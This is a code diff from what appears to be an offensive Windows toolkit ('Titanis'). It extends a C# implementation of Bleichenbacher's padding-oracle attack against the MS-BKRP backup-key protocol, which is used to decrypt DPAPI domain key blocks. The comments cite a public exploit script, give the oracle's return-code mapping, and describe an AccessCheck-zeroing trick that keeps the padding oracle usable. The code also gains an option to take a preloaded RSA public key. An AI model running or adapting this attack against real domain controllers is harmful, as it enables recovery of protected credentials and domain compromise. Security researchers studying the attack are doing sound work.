@@ -37,8 +37,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 	// Bleichenbacher '98 adaptive-chosen-ciphertext attack against RSA PKCS#1 v1.5.
 	//
-	// Reference: Daniel Bleichenbacher, "Chosen Ciphertext Attacks Against Protocols Based
-	// on the RSA Encryption Standard PKCS#1", CRYPTO 1998.
+	// References:
+	//   - Daniel Bleichenbacher, "Chosen Ciphertext Attacks Against Protocols Based
+	//     on the RSA Encryption Standard PKCS#1", CRYPTO 1998.
+	//   - Bad-Jubies/Exploits, "MS-BKRP_padding_oracle_decrypt.py" — Python reference
+	//     implementation of the same attack against MS-BKRP. Informed the oracle return-
+	//     code mapping (0x0/0x0d/0x57) and the AccessCheck-zeroing trick used to keep
+	//     the inner SID check failing while leaving PKCS#1 padding validation intact.
+	//     https://github.com/Bad-Jubies/Exploits/blob/main/MS-BKRP_padding_oracle_decrypt.py
 	//
 	// Oracle contract:
 	//   - Returns true  if the ciphertext produces a PKCS#1-conformant plaintext
@@ -226,14 +232,16 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			DpapiDomainKeyBlock domainKey,
 			BkrpOracleOptions options,
 			IProgress<BleichenbacherProgress>? progress,
-			CancellationToken cancellationToken)
+			CancellationToken cancellationToken,
+			BkrpPublicKeyInfo? preloadedPublicKey = null)
 		{
 			if (session == null) throw new ArgumentNullException(nameof(session));
 			if (domainKey == null) throw new ArgumentNullException(nameof(domainKey));
 			if (options == null) throw new ArgumentNullException(nameof(options));
 
-			// 1. Fetch RSA public key from the DC.
-			var pubKey = await session.GetBackupPublicKeyAsync(cancellationToken).ConfigureAwait(false);
+			// 1. Get RSA public key — from preloaded BK file cert or by querying the DC.
+			var pubKey = preloadedPublicKey
+				?? await session.GetBackupPublicKeyAsync(domainKey.BackupKeyGuid, cancellationToken).ConfigureAwait(false);
 			int k = pubKey.KeySizeBytes;
 
 			// The SecretData in the file is stored little-endian; Bleichenbacher works in big-endian.
